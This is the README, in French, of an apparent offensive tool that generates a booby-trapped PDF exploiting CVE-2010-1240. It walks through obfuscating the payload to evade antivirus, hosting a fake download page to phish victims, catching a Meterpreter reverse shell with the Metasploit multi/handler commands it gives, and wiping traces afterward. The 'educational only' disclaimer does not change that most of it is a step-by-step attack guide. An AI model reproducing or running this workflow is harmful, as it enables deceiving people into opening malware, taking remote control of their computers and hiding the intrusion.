📜 Expdf-Trkn

📌 Exploit PDF CVE-2010-1240 - Générateur par trhacknon

🚀 Expdf-Trkn est un générateur de PDF infecté exploitant la vulnérabilité CVE-2010-1240, avec obfuscation avancée et page de phishing intégrée.

Ce projet inclut aussi un listener Metasploit pour récupérer un shell sur la cible.

⚠️ Disclaimer

❗ Ce projet est uniquement à des fins éducatives et pour des tests en environnement contrôlé.

Toute utilisation illégale est interdite.


---

🔧 Installation

1️⃣ Cloner le repo

```bash
git clone https://github.com/trh4ckn0n/expdf-trkn.git
cd expdf-trkn
chmod +x expdf.sh
```

2️⃣ Lancer le script

```bash
./expdf.sh
```


---

📌 Fonctionnalités

✅ Génération de PDF infecté (CVE-2010-1240)

✅ Obfuscation XOR + Base64 pour échapper aux antivirus

✅ Page de phishing intégrée (fausse page de téléchargement)

✅ Listener Metasploit pour recevoir le shell

✅ Nettoyage automatique des traces


---

📜 Utilisation

🎯 1. Créer un PDF infecté

```bash
./expdf.sh
```

🔹 Entrez votre IP (Kali) et le port d'écoute.

🔹 Choisissez un nom pour le fichier PDF piégé.

🎯 2. Obfusquer le payload

```bash
./expdf.sh
```

🔹 Le PDF sera encodé avec XOR + Base64 pour contourner les antivirus.

🎯 3. Héberger le fichier et lancer la fausse page de phishing

```bash
./expdf.sh
```

🔹 Un serveur Apache est lancé avec un lien pour la victime.

🔹 La victime télécharge le PDF piégé via un faux site sécurisé.

🎯 4. Lancer le listener Metasploit

```bash
./expdf.sh
```

🔹 Attente de connexion de la victime.

🔹 Accès Meterpreter dès l'ouverture du PDF.

🎯 5. Nettoyage des traces

```bash
./expdf.sh
```

🔹 Suppression des fichiers et arrêt d'Apache.


---

💻 Exemple d'attaque

📌 Lien à envoyer à la cible :

http://[TON_IP]/index.html

📌 Commandes Metasploit :

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [TON_IP]
set LPORT [PORT]
run
```

---

👤 Auteur

👨‍💻 Développé par : trhacknon

📂 Repo GitHub : trh4ckn0n/expdf-trkn
